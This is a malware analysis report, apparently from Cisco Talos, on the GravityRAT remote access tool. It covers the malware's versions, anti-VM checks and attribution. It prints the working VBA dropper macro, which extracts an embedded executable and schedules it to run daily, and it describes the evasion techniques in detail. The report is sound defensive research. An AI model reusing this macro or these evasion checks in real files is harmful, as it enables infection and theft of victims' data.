Today, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for
the past two years while it continues to be developed. Several weeks ago, we identified the use of
the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical
capabilities, the evolution, development and potential attribution of what we are calling GravityRAT. 

GravityRAT has been under ongoing development for at least 18 months, during which the developer
has implemented new features. We've seen file exfiltration, remote command execution capability
and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond
standard remote code execution is concerning because it shows determination and innovation by
the actor. 

Throughout our investigation, we observed several malicious documents used to attack victims,
which we will discuss. These malicious documents were used by the developer to run several tests
on the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make
changes in an attempt to decrease antivirus detection.

Although GravityRAT has not been previously published or discussed, there was some information
from the National Computer Emergency Response Team (CERT) of India describing GravityRAT as
being used in targeted attacks against India. Finally, we will discuss specific attribution elements
discovered during our research into GravityRAT as we identify specific information, which we believe
to be leaked by the developer, such as location, and potentially their first name.

The majority of the malicious documents crafted by the malware author are Microsoft Office Word
documents. The attacker uses an embedded macro in order to execute malicious code on the
victim's system. The document opens and appears as such:

The document asks to the user to enable macros in order to prove that the user is not a robot
(similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of

(similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of
Office-based malware uses. It is an attempt to trick any users who are using Protected Mode on
their systems. By enabling macros, the malware is able to begin it's execution. We discovered that
the embedded macro is quite small when extracted.

Sub AutoOpen()
  If Not Dir(Environ("TEMP") + "\image4.exe") <> "" Then
    Const lCancelled_c As Long = 0
      Dim sSaveAsPath As String
      sSaveAsPath = 
CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + 
"\temporary.zip"
      If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub
      ActiveDocument.Save
      Application.Documents.Add ActiveDocument.FullName
      ActiveDocument.SaveAs sSaveAsPath
      ActiveDocument.Close
      Set app = CreateObject("Shell.Application")
      ExtractTo = 
CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
      ExtractByExtension app.NameSpace(Environ("TEMP") + "\temporary.zip"), 
"exe", ExtractTo
  End If
End Sub

Sub ExtractByExtension(fldr, ext, dst)
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Set app = CreateObject("Shell.Application")
  For Each f In fldr.Items
    If f.Type = "File folder" Then
      ExtractByExtension f.GetFolder, ext, dst
    ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then
      If Not Dir(Environ("TEMP") + "\image4.exe") <> "" Then
        app.NameSpace(dst).CopyHere f.Path, &H4
      End If
    End If

  Next
  Shell "schtasks /create /tn wordtest /tr ""'%temp%\image4.exe' 35"" /sc 
DAILY /f /RI 10 /du 24:00 /st 00:01"
End Sub

This macro contains three functions: 

The first one is executed when the document is opened. The purpose is to copy the
active document (the opened Word document) in a temporary directory and to rename it
as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be
unzipped using common tools.

The second function decompresses this 'temporary.zip' file and extracts the .exe file
stored in it.

The third creates a scheduled task, named 'wordtest', to execute this malicious file
every day.

With this approach, the attacker ensures that there is no direct execution (the executable is
executed thanks to scheduled tasks), there's no download of an additional payload, and finally, the
author uses the fact that the docx format is an archive in order to include its executable
(GravityRAT).

During our tracking, we identified several malicious documents submitted from this actor on
VirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by
executing the calc instead of the malicious payload) and the developers tried dynamic data
exchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists
within Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that
an attacker can leverage for malicious activity, Microsoft published mitigation information here
previously. The developer crafted Office Word and Excel documents to see the detection in
VirusTotal. The authors tried to hide the DDE object in a different part of the document — in the
main object and the header, for example. The DDE object simply executes Microsoft calc in the
detected sample. Here is an example:

We believe the filenames of the submitted samples are clearly testing docs, using different
methods and Office tricks to attempt to ensure his malware was undetected. Those names were:

Test123.doc

Our initial discovery of GravityRAT was through a malicious Word document. As explained

G R AV ITY R AT

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


previously, this Word document had various macros to deliver a final payload.Considering that this
was the most recent version of the malware, we decided to ascertain how long this actor had been
active, and how their attacks had evolved. We were able to discover four distinct versions of
GravityRAT, developed over two years. Next, we will go through what we believe is the development
life cycle and feature-addition mission carried out by this developer.

The malware author uses a versioning system starting by the G letter. The oldest version we
identified is G1. Here is the PDB path of the sample:

f:\F\Windows Work\G1\Adeel's Laptop\G1 Main 
Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdb

You can notice the potential first name of the developers: Adeel. Of course, this information can be
manipulated by the malware author. This sample was compiled in December 2016. The original
filename of the sample was resume.exe.

The purpose of this version was to steal information on the compromised system:

MAC Address
Computer name
Username
IP address
Date
Steal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdf
The volumes mapped on the system

All this information was then sent to one of the following domains:

Version G1

Convert webpages to pdf online with PDFmyURL

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


G1 also had the ability to execute commands remotely on the infected host machine at the author's
will.

We identified a new variant used in July 2017 named G2. Here is the PDB of the sample:

e:\Windows Work\G2\G2 Main Virus\Microsoft Virus Solutions (G2 v5) 
(Current)\Microsoft Virus Solutions\obj\Debug\Windows Wireless 802.11.pdb

For this version, the developer modified the architecture of the malware. The main code aims to
load and execute two additional .NET binaries stored in the resources of the file:

The first resource is a legitimate open-source library available on GitHub. It's a .NET
wrapper for the Windows Task Scheduler
The second is the G2 version of GravityRAT

This variant shares the same command and control (C2) servers as G1, however, we have an
additional 'payload' variable added to G2.

Version G2

https://github.com/dahall/TaskScheduler
https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


This variant has almost identical capabilities as the previous, except one additional functionality: It
collects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name,
Manufacturer and the clock speed). The attacker is most likely using this information as part of an
anti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments.

In a slight change to the previous variant, the new payloads are executed with a Windows Scheduled
Task. This would explain the inclusion of the .NET wrapper.

The analysed sample contained a decoy picture document in the resource section:

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


In August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB:

F:\Projects\g3\G3 Version 4.0\G3\G3\obj\Release\Intel Core.pdb

This variant uses the same method as G2, and includes a legitimate library in the resource section.
The developers also added additional language support to the library:

German
Spanish
French
Italian
Chinese

Version G3

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


The author changed the backend of the C2 server with this variant. The URI changed too, it contains
the GravityRAT variant name:

August was also the same month the Indian CERT notified potential victims that GravityRAT had
been used in a targeted campaign. Given the ongoing development nature of this malware, it meant
another variant was most likely due.

The latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:

C:\Users\The Invincible\Desktop\gx\gx-current-
program\LSASS\obj\Release\LSASS.pdb

This version is the most advanced variant of GravityRAT. Throughout the evolution, we saw this
malware embedding open-source legitimate .NET libraries (for schedule tasks, compression,

malware embedding open-source legitimate .NET libraries (for schedule tasks, compression,
encryption, .NET loading). It contains a resource named "important." This is an archive with a
password.

This variant has the same features as before, but this time, some new features are added:

It collects open ports on the victim host by running the netstat command
It lists all the running processes
It lists available services on the system
It exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variant
If a USB key is connected on the system, the malware steals the file based on an
extension list
It supports file encryption (AES with the key "lolomycin2017")
It collects information on the account (account type, description, domain name, full
name, SID and status)
It checks if the system is a virtual machine with several techniques

The developer implemented a total of seven techniques to identify if the compromised system is a
virtual machine.

The first technique consists of looking at any additional tools used by the hypervisor that are
installed on the system (by checking a registry key):

The second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response
contains: "VMware", "Virtual", "XEN", "Xen" or "A M I" the system is considered as a virtual machine.
Additionally, the malware checks the SerialNumber and the version of the BIOS.

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


The third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains
"VIRTUAL", "VMWARE" or "VirtualBox".

The fourth technique checks the Processor ID of the system.

The fifth technique counts the number of cores in the infected system (the author expects more
than one core)

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


The sixth technique checks the current CPU temperature of the system (the
MSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and
Hyper-V) do not support temperature check. The WMI request simply replies "not supported". This
behaviour can be used to detect if the targeted system is a real machine.

The last technique uses the MAC Address of the infected system. If the MAC Address starts by a
well-known hexadecimal number, the system is identified as a virtual machine.

The C2 servers communication is performed in HTTP as it did previously. The variant version of GX
is used in the URI. The C2 servers we can see are shared with the previous variants:

Below, we will present evidence that we have obtained regarding the attacker and the associated
malware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in
order to fake the origin of the submission. But, we will still simply present some facts concerning
this actor. 

The developer used at least two different usernames in the past two years: "The Invincible" and
"TheMartian." In the oldest version of GravityRAT, the attacker potentially leaked his or her first
name in the PDB: "Adeel" — the path contained "Adeel's Laptop". Additionally, all the malicious Office
documents, and more specifically the documents used to test anti-virus on VirusTotal, were
submitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too.

In August 2017, the Indian National CERT published an advisory about malicious targeted
campaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the
GravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and
using the Investigate tool, we were able to determine that across all of the C2 domains listed, we
saw a large influx of traffic originating from India, as evidenced by the National CERT, all of the C2
domains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of
the non-Indian IP space requests may artefacts be due to our own research.

This actor is probably not the most advanced actor we've seen. But he or she managed to stay
under the radar since 2016. They worked on malicious code, and produced four variants. Each new
variant included new features. The developer used the same C2 infrastructure all this time. The
developer was clever enough to keep this infrastructure safe, and not have it blacklisted by a
security vendor. The actor took their time to ensure they were not within a virtual environment to
avoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code.
The code was largely trivial to reverse engineer, which meant static analysis was an easy option for
this piece of malware.

The Indian CERT published an advisory about this actor, which suggest they targeted Indian entities
and organizations.

The author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform.
Thanks to this information, we we able to understand how they tested malicious documents in order
to decrease detection ratios across many popular engines. During this testing period, all the
samples were uploaded from Pakistan to VirusTotal.
